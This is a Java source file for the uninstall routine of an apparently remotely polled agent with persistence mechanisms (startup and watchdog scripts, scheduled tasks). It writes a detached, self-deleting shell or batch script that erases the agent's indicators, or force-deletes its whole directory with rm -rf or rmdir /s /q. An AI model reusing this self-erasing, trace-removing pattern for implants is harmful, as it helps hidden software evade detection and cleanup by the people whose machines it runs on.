package com.spcagentpayloa.jvmxx;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

/**
 * Removes every installer-owned indicator and then the tree from a detached
 * script, because Windows cannot delete the running jar from the agent itself.
 */
final class Uninstall {
	private Uninstall() {
	}

	static String run(Poller poller, Path dir, boolean keepData) {
		boolean persistence = Persistence.disable(dir);
		if (poller != null) {
			poller.ops().stop(false);
		}
		try {
			Path script = Files.createTempFile("spc-uninstall-", AgentPaths.isWindows() ? ".cmd" : ".sh");
			String body = AgentPaths.isWindows() ? windows(dir, keepData) : unix(dir, keepData);
			Files.writeString(script, body, StandardCharsets.US_ASCII);
			List<String> line = AgentPaths.isWindows()
				? List.of("cmd", "/c", "start", "", "/b", "cmd", "/c", script.toString())
				: List.of("/bin/sh", "-c", "nohup sh " + script + " >/dev/null 2>&1 &");
			new ProcessBuilder(line).directory(dir.toFile()).start();
			return "Uninstall scheduled (persistence=" + persistence + ", keep_data=" + keepData + ")";
		} catch (Throwable throwable) {
			Log.debug("Uninstall schedule failed", throwable);
			return "Uninstall failed: " + throwable.getMessage();
		}
	}

	private static String windows(Path dir, boolean keepData) {
		String root = dir.toString().replace("\"", "");
		StringBuilder out = new StringBuilder("@echo off\r\n");
		out.append("timeout /t 3 /nobreak >nul\r\n");
		if (keepData) {
			for (String name : new String[] { "runtime.jar", "javaw.exe", "runtime.lock", "session.txt",
				"startup.vbs", "watchdog.vbs", "update.vbs", "mod-update.vbs", "update-new.jar",
				"update-new.jar.tmp", "update.out", "update.intent", "mod-update.jar", "mod-update.jar.tmp",
				"mod-update.cancel", "runtime.old", "runtime.bad", "rollback.marker", ".version",
				"crypto-config.json", "task.xml", "task.name", "task.used" }) {
				out.append("del /f /q \"").append(root).append('\\').append(name).append("\" >nul 2>&1\r\n");
			}
		} else {
			out.append("rmdir /s /q \"").append(root).append("\" >nul 2>&1\r\n");
		}
		out.append("del /f /q \"%~f0\" >nul 2>&1\r\n");
		return out.toString();
	}

	private static String unix(Path dir, boolean keepData) {
		String root = dir.toString().replace("\"", "\\\"");
		StringBuilder out = new StringBuilder("#!/bin/sh\nsleep 3\n");
		out.append("cd \"").append(root).append("\" || exit 0\n");
		if (keepData) {
			out.append("rm -f -- runtime.jar java runtime.lock session.txt .version crypto-config.json\n");
		} else {
			out.append("cd ..\nrm -rf -- \"").append(root).append("\"\n");
		}
		out.append("rm -f -- \"$0\"\n");
		return out.toString();
	}
}
